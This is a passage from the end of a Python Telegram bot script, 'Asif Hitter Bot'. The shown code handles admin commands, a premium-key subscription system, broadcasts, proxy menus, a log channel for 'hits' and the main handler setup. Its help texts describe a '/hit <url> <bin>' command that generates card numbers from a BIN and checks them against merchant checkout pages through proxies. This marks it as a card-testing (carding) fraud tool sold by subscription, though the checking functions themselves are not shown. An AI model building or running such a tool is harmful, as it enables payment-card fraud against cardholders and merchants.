    pd = jload(PREMIUM_FILE, {"users": {}})
    users = pd.get("users", {})
    
    if not users:
        await update.message.reply_text(f"{e('❌')} No premium users", parse_mode=ParseMode.HTML)
        return
    
    txt = f"{e('👑')} <b>PREMIUM USERS</b>\n\n"
    for uid, u in users.items():
        try:
            exp = datetime.fromisoformat(u.get("expiry","2000-01-01"))
            active = e('🟢') if datetime.now() < exp else e('🔴')
            txt += f"{active} <a href=\"tg://user?id={uid}\">{h(u.get('name','?'))}</a>\n"
            txt += f"   {e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            txt += f"   {e('💎')} Plan: <code>{u.get('plan','?')}</code>\n\n"
        except: pass
    
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/rmsub &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    uid = ctx.args[0]
    pd = jload(PREMIUM_FILE, {"users": {}})
    
    if uid not in pd.get("users", {}):
        await update.message.reply_text(f"{e('❌')} User not found", parse_mode=ParseMode.HTML)
        return
    
    del pd["users"][uid]
    jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(f"{e('✅')} User premium removed!", parse_mode=ParseMode.HTML)
    try:
        await ctx.bot.send_message(int(uid), f"{e('⛔')} Your premium has been revoked by admin.", parse_mode=ParseMode.HTML)
    except: pass

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    msg = update.message.text.replace("/broadcast", "").strip()
    if not msg:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/broadcast &lt;message&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    pd = jload(PREMIUM_FILE, {"users": {}})
    sent = 0
    for uid in pd.get("users", {}):
        try:
            await ctx.bot.send_message(int(uid), f"{e('📢')} <b>BROADCAST</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            sent += 1
        except: pass
    
    await update.message.reply_text(f"{e('✅')} Broadcast sent to <b>{sent}</b> users", parse_mode=ParseMode.HTML)

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    global LOG_CHANNEL
    if ctx.args:
        LOG_CHANNEL = ctx.args[0]
        await update.message.reply_text(f"{e('✅')} Log channel set to: {h(LOG_CHANNEL)}", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"{e('ℹ️')} Current: {h(LOG_CHANNEL)}\nUsage: <code>/sethits @channel</code>", parse_mode=ParseMode.HTML)

# ═══════════════ CALLBACKS ═══════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    d = q.data
    
    if d == "gate_help":
        await q.message.reply_text(f"{e('🌐')} <b>Gateway Check</b>\n\n{e('ℹ️')} Usage: <code>/gate &lt;url&gt;</code>\nChecks merchant &amp; amount.", parse_mode=ParseMode.HTML)
    elif d == "hit_help":
        await q.message.reply_text(f"{e('💳')} <b>Hit Checkout</b>\n\n{e('👑')} Premium only!\n{e('ℹ️')} Usage: <code>/hit &lt;url&gt; &lt;bin&gt;</code>\nGenerates 10 cards &amp; checks.", parse_mode=ParseMode.HTML)
    elif d == "redeem_help":
        await q.message.reply_text(f"{e('🔑')} <b>Redeem Key</b>\n\n{e('ℹ️')} Usage: <code>/auth &lt;key&gt;</code>\nActivate premium.", parse_mode=ParseMode.HTML)
    elif d == "status":
        await cmd_status(update, ctx)
    elif d == "proxy_menu":
        await q.message.reply_text(
            f"{e('🔐')} <b>PROXY MANAGER</b>\n\n"
            f"{e('📌')} /addproxy — Add proxies\n"
            f"{e('🔍')} /proxy — Check proxies\n"
            f"{e('🗑')} /rmproxy — Remove proxies\n\n"
            f"{e('ℹ️')} Max: <b>{MAX_PROXIES}</b> proxies",
            parse_mode=ParseMode.HTML
        )
    elif d == "admin" and is_admin(uid):
        kb = [
            [InlineKeyboardButton(f"{e('🔑')} Gen Keys", callback_data="genkey_menu")],
            [InlineKeyboardButton(f"{e('👥')} Premium Users", callback_data="prem_list")],
            [InlineKeyboardButton(f"{e('📢')} Broadcast", callback_data="bcast_help")],
        ]
        await q.message.reply_text(
            f"{e('⚡')} <b>ADMIN PANEL</b>\n\n"
            f"{e('🔑')} /genkey 10 7 PREMIUM\n"
            f"{e('👥')} /premium — List users\n"
            f"{e('🗑')} /rmsub &lt;id&gt; — Remove user\n"
            f"{e('📢')} /broadcast &lt;msg&gt; — Send to all\n"
            f"{e('📡')} /sethits @channel — Set log",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb)
        )

# ═══════════════ AUTO EXPIRE ═══════════════

async def expire_checker(ctx: ContextTypes.DEFAULT_TYPE):
    pd = jload(PREMIUM_FILE, {"users": {}})
    expired = []
    for uid, u in pd.get("users", {}).items():
        try:
            if datetime.now() > datetime.fromisoformat(u.get("expiry","2000-01-01")):
                expired.append(uid)
        except: pass
    
    for uid in expired:
        del pd["users"][uid]
        try:
            await ctx.bot.send_message(
                int(uid),
                f"{ec('⛔',3)} <b>PREMIUM EXPIRED</b> {ec('⛔',3)}\n\n"
                f"{e('⏱️')} Your premium access has ended.\n"
                f"{e('🔑')} Get a new key to continue.\n"
                f"{e('❤️')} <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>",
                parse_mode=ParseMode.HTML
            )
        except: pass
    
    if expired:
        jsave(PREMIUM_FILE, pd)

# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════

def main():
    print("Starting Asif Hitter Bot...")
    
    os.makedirs(DATA_DIR, exist_ok=True)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("hit", cmd_hit))
    app.add_handler(CommandHandler("auth", cmd_auth))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("premium", cmd_premium))
    app.add_handler(CommandHandler("rmsub", cmd_rmsub))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("sethits", cmd_sethits))
    app.add_handler(CallbackQueryHandler(on_callback))
    
    # Auto expire check
    if app.job_queue:
        app.job_queue.run_repeating(expire_checker, interval=1800, first=30)
    
    print("Bot running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()